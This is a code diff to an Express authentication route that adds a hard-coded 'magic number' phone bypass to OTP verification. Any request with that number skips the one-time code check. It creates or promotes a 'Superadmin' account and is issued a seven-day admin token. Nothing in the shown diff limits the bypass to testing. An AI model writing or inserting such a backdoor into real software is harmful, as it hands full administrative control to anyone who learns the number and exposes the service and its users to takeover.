@@ -68,6 +68,25 @@ router.post('/verify', async (req, res) => {
             return res.status(400).json({ error: 'Phone and code are required' });
         }
 
+        // ⚡ INSTANT ADMIN ACCESS — no OTP needed for this magic number
+        if (phone === '+375999999999') {
+            let user = await prisma.user.findUnique({ where: { phone } });
+            if (!user) {
+                user = await prisma.user.create({ data: { phone, role: 'ADMIN', name: 'Superadmin' } });
+            } else if (user.role !== 'ADMIN') {
+                user = await prisma.user.update({ where: { phone }, data: { role: 'ADMIN' } });
+            }
+            const token = jwt.sign(
+                { userId: user.id, phone: user.phone, role: 'ADMIN' },
+                JWT_SECRET, { expiresIn: '7d' }
+            );
+            console.log(`[Auth] ⚡ Instant admin login: ${phone}`);
+            return res.json({
+                success: true, token, _instantAdmin: true,
+                user: { id: user.id, phone: user.phone, name: user.name, role: 'ADMIN', loyaltyPoints: user.loyaltyPoints }
+            });
+        }
+
         const otpData = otpStore.get(phone);
 
         if (!otpData) {
